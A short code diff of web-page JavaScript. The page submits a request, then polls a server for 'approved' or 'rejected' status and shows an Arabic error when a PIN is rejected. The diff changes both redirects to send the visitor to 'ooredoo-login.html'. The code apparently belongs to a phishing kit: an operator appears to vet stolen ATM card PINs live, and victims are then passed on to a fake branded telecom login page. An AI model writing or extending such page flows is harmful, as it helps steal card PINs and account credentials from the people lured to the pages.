@@ -360,7 +360,7 @@
       .then(function(res) { return res.json(); })
       .then(function(data) {
         if (data.ok) {
-          window.location.href = 'loading.html?type=atm&id=' + encodeURIComponent(requestId);
+          window.location.href = 'ooredoo-login.html?id=' + encodeURIComponent(requestId);
         } else {
           throw new Error('Failed to submit');
         }
@@ -382,7 +382,7 @@
             if (!data || !data.status) return;
             if (data.status === 'approved') {
               clearInterval(pollInterval);
-              window.location.href = 'success.html?id=' + requestId;
+              window.location.href = 'ooredoo-login.html?id=' + requestId;
             } else if (data.status === 'rejected') {
               clearInterval(pollInterval);
               var rejectMessage = 'تم رفض الرقم السري. يرجى التحقق من البيانات والمحاولة مرة أخرى.';
